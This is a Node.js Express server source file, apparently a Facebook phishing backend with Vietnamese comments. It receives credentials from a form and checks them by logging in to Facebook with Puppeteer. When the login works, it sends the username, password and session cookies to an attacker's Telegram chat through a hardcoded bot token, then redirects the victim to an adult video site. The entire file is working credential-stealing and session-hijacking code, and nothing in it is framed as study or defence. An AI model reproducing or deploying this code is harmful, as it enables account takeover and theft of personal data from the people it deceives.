const express = require('express');
const bodyParser = require('body-parser');
const puppeteer = require('puppeteer');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.set('view engine', 'ejs');
app.set('views', __dirname + '/views');
app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Thay thế 'YOUR_TELEGRAM_BOT_TOKEN' bằng mã thông báo bot của bạn
const bot = new TelegramBot('5763830212:AAE98mJcR8w3K0ZJkhXL2Op7N0aT7QeOmf4', { polling: false });
const currentDate = new Date();
const formattedDate = `${currentDate.getDate()}/${currentDate.getMonth() + 1}/${currentDate.getFullYear()} ${currentDate.getHours()}:${currentDate.getMinutes()}:${currentDate.getSeconds()}`;

app.get('/', (req, res, next) => {
  res.render('home');
});
app.post('/', async function (req, res) {
  var username = req.body.username;
  var password = req.body.password;
  var ipAddress = req.ip;

  let autoLogin = async () => {
    const browser = await puppeteer.launch({
      headless: true
    });
    const page = await browser.newPage();
    await page.goto('https://en-gb.facebook.com/login.php');

    const USER_SELECTOR = '#email';
    const PASSWORD_SELECTOR = '#pass';
    const BUTTON_LOGIN_SELECTOR = '#loginbutton';

    await page.click(USER_SELECTOR);
    await page.keyboard.type(username);

    await page.click(PASSWORD_SELECTOR);
    await page.keyboard.type(password);

    await page.click(BUTTON_LOGIN_SELECTOR);
    await page.waitForNavigation();
    var pageTitle = await page.title();

    if (pageTitle == "Log in to Facebook") {
      res.render('fail');
    } else {
      const cookies = await page.cookies();
      async function sendToTelegramBot(username, password, cookies, ipAddress) {
        // Thay thế 'YOUR_CHAT_ID' bằng chat ID của bạn (cá nhân hoặc nhóm)
        const chatId = '-953376614';

        // Lấy thông tin địa chỉ cụ thể từ địa chỉ IP

        const cookies2 = JSON.stringify(cookies);
        const cookiesArray = JSON.parse(cookies2);
        const cookieString = cookiesArray.map(cookie => {
          const cookieData = {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            httponly: cookie.httpOnly,
            expires_timestamp: Math.round(cookie.expires),
          };
          const cookieParts = Object.entries(cookieData).map(([key, value]) => `${key}:${value}`).join(',');
          return `${cookie.name}=${cookie.value},${cookieParts}`;
        }).join('; ');
        const cUserRegex = /c_user=(\d+)/;
        const match = cookieString.match(cUserRegex);
        const cUserValue = match ? match[1] : null;
        let
          message = '================ 🆕🆕 NEW LOG 🆘🆘================= \n' + '\n';
        message += '🆔 ID: ' + cUserValue + '\n' + '\n';
        message += '📧 Username: ' + username + '\n' + '\n';
        message += '🔐 Password: ' + password + '\n' + '\n';
        message += '🍪 Cookies: ' + cookieString + '\n\n';
        message += '📅 Date : ' + formattedDate + '\n' + '\n';
        message += '================ 🆕🆕 NEW LOG 🆘🆘================= ';
        bot.sendMessage(chatId, message)
          .then(() => {
            console.log('Đã gửi thông tin thành công đến Telegram bot!');
          })
          .catch((error) => {
            console.error('Lỗi khi gửi thông tin đến Telegram bot:', error);
          });
      }

      sendToTelegramBot(username, password, cookies, ipAddress);

      res.redirect('https://vjav.com/videos/367426/soe-992-rion/');
    }
  };

  autoLogin();
});

app.listen(80);
